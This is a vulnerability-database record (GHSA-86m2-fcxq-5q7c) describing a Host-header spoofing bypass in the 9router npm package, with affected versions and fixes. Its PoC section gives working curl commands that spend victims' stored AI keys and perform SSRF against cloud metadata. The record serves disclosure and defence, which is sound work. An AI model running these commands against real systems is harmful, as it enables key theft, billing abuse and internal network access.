@@ -1,0 +1,376 @@
+advisory_id: GHSA-86m2-fcxq-5q7c
+datasource_id: github_osv/GHSA-86m2-fcxq-5q7c
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-86m2-fcxq-5q7c/GHSA-86m2-fcxq-5q7c.json
+aliases:
+  - CVE-2026-55641
+summary: |
+  9router: Unauthenticated `/v1` proxy access via `Host`-header spoofing → open AI relay + SSRF
+  ## Summary
+
+  9router's request guard decides a request is "local" (and therefore exempt from API-key auth on the `/v1` LLM proxy) by reading the **client-controlled `Host` header**. Because 9router binds `0.0.0.0` by default (and the CLI misleadingly prints "localhost"), a remote, unauthenticated attacker who can reach the port can send `Host: localhost` to be treated as local and obtain `/v1` proxy access with **no API key, no CLI token, and no dashboard login**. In the default configuration (`requireApiKey` is absent from `DEFAULT_SETTINGS`, so the handler-side key check is skipped), this yields:
+
+  - **Open AI relay** — the proxy forwards the attacker's requests to AI providers using the **victim's stored paid API keys** (cost/quota theft, prompt-based data exfiltration through the victim's accounts).
+  - **Unauthenticated SSRF** — `/v1/search` with the built-in `noAuth` `searxng` provider takes its outbound fetch URL from the request body (`provider_options.baseUrl`), so the attacker drives a server-side fetch to any internal/cloud-metadata host and gets the JSON response reflected back.
+
+  - **Affected:** `9router <= 0.4.80` (current), `src/dashboardGuard.js` (`isLocalRequest`), `src/sse/handlers/{chat,search}.js`, `src/lib/db/repos/settingsRepo.js`, `cli/cli.js`.
+  - **Distinct from** the existing advisories GHSA-fhh6-4qxv-rpqj (MCP-plugin RCE, patched) and GHSA-xrrh-p7f2-27vm (legacy `<0.3.75` authz bypass).
+
+  ## Details
+
+  ### The bypass (`src/dashboardGuard.js`)
+  ```js
+  function isLoopbackHostname(h){ const name=h.split(":")[0].replace(/^\[|\]$/g,"").toLowerCase();
+    return new Set(["localhost","127.0.0.1","::1"]).has(name); }
+  function isLocalRequest(request){
+    if (!isLoopbackHostname(request.headers.get("host"))) return false;   // <-- client-controlled Host
+    const origin = request.headers.get("origin");
+    if (origin){ try { if (!isLoopbackHostname(new URL(origin).hostname)) return false; } catch { return false; } }
+    return true;
+  }
+  async function canAccessPublicLlmApi(request){
+    if (isLocalRequest(request)) return true;     // <-- "local" => no key required
+    if (await hasValidCliToken(request)) return true;
+    return await hasValidApiKey(request);
+  }
+  ```
+  `isLocalRequest` never consults the **socket peer address** — only the spoofable `Host` header (and an absent/loopback `Origin`). The `/v1`,`/v1beta`,`/api/v1`,`/api/v1beta` prefixes are gated solely by `canAccessPublicLlmApi`.
+
+  ### Default exposure
+  - `cli/cli.js:63` `const DEFAULT_HOST = "0.0.0.0";` and `Dockerfile` `ENV HOSTNAME=0.0.0.0` / `EXPOSE 20128` → reachable from the network by default.
+  - `cli/cli.js:500,541` display `"localhost"` even when bound to `0.0.0.0` — operators believe it's local-only.
+  - `src/lib/db/repos/settingsRepo.js` `DEFAULT_SETTINGS` has **no `requireApiKey`** → the handler key checks (`chat.js` `if (settings.requireApiKey)`, `search.js` same) are skipped by default.
+
+  ### Relay chain (verbatim trace, 0.4.71)
+  middleware (`src/proxy.js`, matcher covers all paths) → `canAccessPublicLlmApi` true via spoofed Host → `next.config.mjs` rewrites `/v1/:path*`→`/api/v1/:path*` → `src/app/api/v1/messages/route.js` POST → `handleChat` (no independent auth) → only gate falsy `requireApiKey` → `getProviderCredentials()` loads the victim's stored credentials → `handleChatCore` outbound fetch → response returned. **No downstream key gate.**
+
+  ### SSRF chain
+  `search.js` (only gate falsy `requireApiKey`) → `searxng` `noAuth:true` ⇒ `handleSearchCore({credentials:null})` → `coreBody.provider_options = body.provider_options` → `callers.js`:
+  ```js
+  export function resolveBaseUrl(config, params){
+    const override = getProviderSetting(params, "baseUrl");   // reads params.providerOptions.baseUrl FIRST
+    return (override || config.baseUrl).replace(/\/+$/, "");
+  }
+  ```
+  → `buildSearxngRequest` appends `/search?q=...&format=json&categories=general` → `fetch(url)` (server-side) → JSON reflected to caller.
+
+  ## PoC
+
+  Ground-truth, no network egress: `harness/hostspoof.mjs` (verbatim guard logic) and `harness/ssrf_search.mjs` (imports the *real* `handleSearchCore` + `AI_PROVIDERS.searxng`).
+
+  **Guard bypass (`hostspoof.mjs`, exit 2):**
+  ```
+  attacker: remote, NO api key, NO cli token. Want canAccessPublicLlmApi === true == BYPASS
+     denied       honest remote (real Host)
+  *** ALLOWED ***  SPOOF Host: localhost (no Origin)
+  *** ALLOWED ***  SPOOF Host: 127.0.0.1
+  *** ALLOWED ***  SPOOF Host: localhost:20128
+     denied       SPOOF Host + Origin evil (blocked)
+  RESULT: BYPASS — remote key-less attacker spoofing Host: localhost is granted /v1 proxy access.
+  ```
+
+  **SSRF (`ssrf_search.mjs`, real imported code):**
+  ```
+  [*] searxng configured baseUrl: http://localhost:8888/search
+  [*] attacker provider_options.baseUrl: http://127.0.0.1:<port>
+  [*] credentials passed to core: null (noAuth => key-less attacker)
+  internal service reached by 9router process: true
+  path hit: /search?q=x&format=json&categories=general
+  data returned to attacker: [{"title":"INTERNAL-DATA",...,"content":"leaked"...}]
+  SSRF CONFIRMED: key-less request drove a server-side fetch to attacker URL.
+  ```
+
+  ### Live confirmation against a RUNNING 9router (real HTTP, not just source/harness)
+
+  Built & ran `9router@0.4.71` (Next.js 16.2.9, bound `0.0.0.0:20128`, **default settings, no provider configured, no api key/login**). Attacker = a request to the box's **non-loopback LAN IP `10.204.111.34`** (a genuine remote peer); only the `Host` header differs between the control and the attack:
+
+  ```
+  (A) honest Host (the IP):     POST /v1/search  Host: 10.204.111.34:20128
+      => HTTP 401 {"error":"API key required for remote API access"}      [guard blocks remote]
+
+  (B) spoofed Host: localhost:  POST /v1/search  Host: localhost
+         body: {"provider":"searxng","query":"x","provider_options":{"baseUrl":"http://127.0.0.1:19099"}}
+      => HTTP 200, and the attacker's listener logged:
+         [ATTACKER-LISTENER] 9router CONNECTED: GET /search?q=x&format=json&categories=general | from 127.0.0.1
+      => the 9router SERVER PROCESS issued a GET to the attacker-controlled URL  = unauthenticated SSRF.
+
+  (B') relay path POST /v1/messages, same Host-spoof:
+         honest Host => 401 ;  Host: localhost => 404 {"error":"No active credentials for provider: openai"}
+      => bypass reached handleChat's provider selection (would forward on the VICTIM'S key if one were configured).
+  ```
+  Changing **only** the `Host` header (401 → reaches the handler), from the same remote peer, is the entire bypass — confirmed live on a default-config running instance. (Full SSRF response *reflection* requires the upstream to return searxng-shaped JSON; otherwise it is a blind/semi-blind SSRF — the server-side request to the attacker URL is the proven primitive. The relay needs ≥1 configured provider — the normal state — to actually spend the victim's key.) See `repro/LIVE-EVIDENCE.txt`.
+
+  **Reproduce** (against a network-reachable 9router; `VICTIM_IP` = the box):
+  ```bash
+  # Open AI relay — no Authorization/x-api-key/cookie; victim's key pays:
+  curl -sS http://VICTIM_IP:20128/v1/messages -H 'Host: localhost' -H 'Content-Type: application/json' \
+    -d '{"model":"claude-3-5-sonnet-20241022","max_tokens":64,"messages":[{"role":"user","content":"relay test"}]}'
+
+  # SSRF — attacker-controlled server-side fetch (e.g. cloud metadata), JSON reflected:
+  curl -sS http://VICTIM_IP:20128/v1/search -H 'Host: localhost' -H 'Content-Type: application/json' \
+    -d '{"provider":"searxng","query":"x","provider_options":{"baseUrl":"http://169.254.169.254/latest/meta-data"}}'
+  ```
+
+  ## Impact
+
+  Any 9router reachable on a network (default `0.0.0.0` bind, plus Docker `-p`, tunnel, or tailscale — all first-class features) can be:
+  - used as a free AI relay billed to the victim's provider accounts, exhausting quota and exfiltrating data through their keys; and
+  - used to reach internal services / cloud metadata (`169.254.169.254`) with the response reflected to the attacker.
+  Unauthenticated, no user interaction, default configuration. The only precondition is the normal one (≥1 configured provider).
+
+  ## Recommended fix
+  1. Determine "local" from the **socket peer IP**, never the `Host` header — treat as local only if the TCP peer is `127.0.0.0/8` / `::1`.
+  2. Bind `127.0.0.1` by default; require an explicit, warned opt-in for `0.0.0.0`; fix the CLI to not print "localhost" when bound to all interfaces.
+  3. For any non-loopback peer, require a valid API key regardless of `requireApiKey`; add `requireApiKey: true` to `DEFAULT_SETTINGS` (fail-closed).
+  4. Validate `provider_options.baseUrl` against an allowlist (or drop the override) and block requests to private/link-local ranges in `resolveBaseUrl`.
+  5. Remove `Access-Control-Allow-Origin: *` from `/v1` GET metadata routes.
+impacted_packages:
+  - purl: pkg:npm/9router
+    affected_versions: vers:npm/<0.5.2
+    fixed_versions: vers:npm/0.5.2
+    affected_packages:
+      - pkg:npm/9router@0.2.13
+      - pkg:npm/9router@0.2.14
+      - pkg:npm/9router@0.2.15
+      - pkg:npm/9router@0.2.16
+      - pkg:npm/9router@0.2.17
+      - pkg:npm/9router@0.2.18
+      - pkg:npm/9router@0.2.19
+      - pkg:npm/9router@0.2.20
+      - pkg:npm/9router@0.2.21
+      - pkg:npm/9router@0.2.22
+      - pkg:npm/9router@0.2.23
+      - pkg:npm/9router@0.2.24
+      - pkg:npm/9router@0.2.25
+      - pkg:npm/9router@0.2.26
+      - pkg:npm/9router@0.2.27
+      - pkg:npm/9router@0.2.29
+      - pkg:npm/9router@0.2.30
+      - pkg:npm/9router@0.2.31
+      - pkg:npm/9router@0.2.32
+      - pkg:npm/9router@0.2.33
+      - pkg:npm/9router@0.2.34
+      - pkg:npm/9router@0.2.36
+      - pkg:npm/9router@0.2.37
+      - pkg:npm/9router@0.2.38
+      - pkg:npm/9router@0.2.39
+      - pkg:npm/9router@0.2.40
+      - pkg:npm/9router@0.2.41
+      - pkg:npm/9router@0.2.42
+      - pkg:npm/9router@0.2.43
+      - pkg:npm/9router@0.2.44
+      - pkg:npm/9router@0.2.45
+      - pkg:npm/9router@0.2.46
+      - pkg:npm/9router@0.2.47
+      - pkg:npm/9router@0.2.48
+      - pkg:npm/9router@0.2.49
+      - pkg:npm/9router@0.2.50
+      - pkg:npm/9router@0.2.51
+      - pkg:npm/9router@0.2.52
+      - pkg:npm/9router@0.2.53
+      - pkg:npm/9router@0.2.54
+      - pkg:npm/9router@0.2.56
+      - pkg:npm/9router@0.2.57
+      - pkg:npm/9router@0.2.58
+      - pkg:npm/9router@0.2.59
+      - pkg:npm/9router@0.2.60
+      - pkg:npm/9router@0.2.61
+      - pkg:npm/9router@0.2.62
+      - pkg:npm/9router@0.2.63
+      - pkg:npm/9router@0.2.64
+      - pkg:npm/9router@0.2.65
+      - pkg:npm/9router@0.2.66
+      - pkg:npm/9router@0.2.67
+      - pkg:npm/9router@0.2.68
+      - pkg:npm/9router@0.2.70
+      - pkg:npm/9router@0.2.71
+      - pkg:npm/9router@0.2.72
+      - pkg:npm/9router@0.2.73
+      - pkg:npm/9router@0.2.74
+      - pkg:npm/9router@0.2.75
+      - pkg:npm/9router@0.2.76
+      - pkg:npm/9router@0.2.77
+      - pkg:npm/9router@0.2.78
+      - pkg:npm/9router@0.2.79
+      - pkg:npm/9router@0.2.80
+      - pkg:npm/9router@0.2.81
+      - pkg:npm/9router@0.2.83
+      - pkg:npm/9router@0.2.84
+      - pkg:npm/9router@0.2.87
+      - pkg:npm/9router@0.2.88
+      - pkg:npm/9router@0.2.89
+      - pkg:npm/9router@0.2.90
+      - pkg:npm/9router@0.2.91
+      - pkg:npm/9router@0.2.92
+      - pkg:npm/9router@0.2.93
+      - pkg:npm/9router@0.2.94
+      - pkg:npm/9router@0.2.95
+      - pkg:npm/9router@0.2.96
+      - pkg:npm/9router@0.2.97
+      - pkg:npm/9router@0.2.98
+      - pkg:npm/9router@0.3.3
+      - pkg:npm/9router@0.3.5
+      - pkg:npm/9router@0.3.6
+      - pkg:npm/9router@0.3.7
+      - pkg:npm/9router@0.3.8
+      - pkg:npm/9router@0.3.9
+      - pkg:npm/9router@0.3.10
+      - pkg:npm/9router@0.3.11
+      - pkg:npm/9router@0.3.12
+      - pkg:npm/9router@0.3.13
+      - pkg:npm/9router@0.3.14
+      - pkg:npm/9router@0.3.15
+      - pkg:npm/9router@0.3.16
+      - pkg:npm/9router@0.3.17
+      - pkg:npm/9router@0.3.19
+      - pkg:npm/9router@0.3.20
+      - pkg:npm/9router@0.3.21
+      - pkg:npm/9router@0.3.22
+      - pkg:npm/9router@0.3.23
+      - pkg:npm/9router@0.3.24
+      - pkg:npm/9router@0.3.27
+      - pkg:npm/9router@0.3.28
+      - pkg:npm/9router@0.3.29
+      - pkg:npm/9router@0.3.30
+      - pkg:npm/9router@0.3.31
+      - pkg:npm/9router@0.3.32
+      - pkg:npm/9router@0.3.33
+      - pkg:npm/9router@0.3.34
+      - pkg:npm/9router@0.3.35
+      - pkg:npm/9router@0.3.36
+      - pkg:npm/9router@0.3.40
+      - pkg:npm/9router@0.3.41
+      - pkg:npm/9router@0.3.42
+      - pkg:npm/9router@0.3.44
+      - pkg:npm/9router@0.3.46
+      - pkg:npm/9router@0.3.47
+      - pkg:npm/9router@0.3.48
+      - pkg:npm/9router@0.3.49
+      - pkg:npm/9router@0.3.50
+      - pkg:npm/9router@0.3.51
+      - pkg:npm/9router@0.3.52
+      - pkg:npm/9router@0.3.53
+      - pkg:npm/9router@0.3.54
+      - pkg:npm/9router@0.3.55
+      - pkg:npm/9router@0.3.56
+      - pkg:npm/9router@0.3.57
+      - pkg:npm/9router@0.3.58
+      - pkg:npm/9router@0.3.60
+      - pkg:npm/9router@0.3.61
+      - pkg:npm/9router@0.3.62
+      - pkg:npm/9router@0.3.63
+      - pkg:npm/9router@0.3.64
+      - pkg:npm/9router@0.3.65
+      - pkg:npm/9router@0.3.66
+      - pkg:npm/9router@0.3.68
+      - pkg:npm/9router@0.3.69
+      - pkg:npm/9router@0.3.70
+      - pkg:npm/9router@0.3.71
+      - pkg:npm/9router@0.3.72
+      - pkg:npm/9router@0.3.74
+      - pkg:npm/9router@0.3.75
+      - pkg:npm/9router@0.3.76
+      - pkg:npm/9router@0.3.78
+      - pkg:npm/9router@0.3.79
+      - pkg:npm/9router@0.3.80
+      - pkg:npm/9router@0.3.81
+      - pkg:npm/9router@0.3.82
+      - pkg:npm/9router@0.3.83
+      - pkg:npm/9router@0.3.84
+      - pkg:npm/9router@0.3.85
+      - pkg:npm/9router@0.3.87
+      - pkg:npm/9router@0.3.89
+      - pkg:npm/9router@0.3.90
+      - pkg:npm/9router@0.3.91
+      - pkg:npm/9router@0.3.96
+      - pkg:npm/9router@0.3.97
+      - pkg:npm/9router@0.3.98
+      - pkg:npm/9router@0.3.99
+      - pkg:npm/9router@0.4.1
+      - pkg:npm/9router@0.4.2
+      - pkg:npm/9router@0.4.3
+      - pkg:npm/9router@0.4.5
+      - pkg:npm/9router@0.4.6
+      - pkg:npm/9router@0.4.8
+      - pkg:npm/9router@0.4.9
+      - pkg:npm/9router@0.4.10
+      - pkg:npm/9router@0.4.11
+      - pkg:npm/9router@0.4.12
+      - pkg:npm/9router@0.4.13
+      - pkg:npm/9router@0.4.14
+      - pkg:npm/9router@0.4.15
+      - pkg:npm/9router@0.4.16
+      - pkg:npm/9router@0.4.17
+      - pkg:npm/9router@0.4.18
+      - pkg:npm/9router@0.4.19
+      - pkg:npm/9router@0.4.20
+      - pkg:npm/9router@0.4.25
+      - pkg:npm/9router@0.4.26
+      - pkg:npm/9router@0.4.27
+      - pkg:npm/9router@0.4.28
+      - pkg:npm/9router@0.4.29
+      - pkg:npm/9router@0.4.31
+      - pkg:npm/9router@0.4.33
+      - pkg:npm/9router@0.4.36
+      - pkg:npm/9router@0.4.37
+      - pkg:npm/9router@0.4.39
+      - pkg:npm/9router@0.4.41
+      - pkg:npm/9router@0.4.45
+      - pkg:npm/9router@0.4.46
+      - pkg:npm/9router@0.4.49
+      - pkg:npm/9router@0.4.50
+      - pkg:npm/9router@0.4.52
+      - pkg:npm/9router@0.4.55
+      - pkg:npm/9router@0.4.58
+      - pkg:npm/9router@0.4.59
+      - pkg:npm/9router@0.4.62
+      - pkg:npm/9router@0.4.63
+      - pkg:npm/9router@0.4.66
+      - pkg:npm/9router@0.4.71
+      - pkg:npm/9router@0.4.80
+    fixed_packages:
+      - pkg:npm/9router@0.5.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/decolua/9router
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/decolua/9router
+        commit: b282f0554972ea35281520738759d76abcd0b0b3
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-86m2-fcxq-5q7c/GHSA-86m2-fcxq-5q7c.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-1327
+  - CWE-348
+  - CWE-918
+  - CWE-290
+references:
+  - url: https://github.com/decolua/9router
+    reference_type:
+    reference_id:
+  - url: https://github.com/decolua/9router/commit/b282f0554972ea35281520738759d76abcd0b0b3
+    reference_type: other
+    reference_id: b282f0554972ea35281520738759d76abcd0b0b3
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-55641
+    reference_type:
+    reference_id: CVE-2026-55641
+  - url: https://github.com/decolua/9router/security/advisories/GHSA-86m2-fcxq-5q7c
+    reference_type: other
+    reference_id: GHSA-86m2-fcxq-5q7c
+  - url: https://github.com/decolua/9router/releases/tag/v0.5.2
+    reference_type: other
+    reference_id: v0.5.2
+exploits: []
